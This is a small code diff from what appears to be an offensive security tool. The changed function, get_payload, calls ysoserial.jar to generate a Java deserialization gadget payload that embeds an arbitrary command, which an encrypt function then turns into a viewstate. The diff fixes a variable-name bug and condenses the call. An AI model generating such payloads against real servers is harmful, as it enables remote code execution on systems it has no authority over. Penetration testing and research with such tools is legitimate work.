@@ -34,9 +34,7 @@ def get_payload(payload_type: str, command: str) -> bytes:
     """
     if not isfile("ysoserial.jar"):
         raise JarNotFoundException("Unable to open file. Either the file doesn't exist or you have no read permissions.")
-    payload_generator = f"java -jar ysoserial.jar {type} '{command}'"
-    viewstate = check_output(split(payload_generator))
-    return viewstate
+    return check_output(split(f"java -jar ysoserial.jar {payload_type} '{command}'"))
 
 
 def encrypt(viewstate: bytes) -> str:
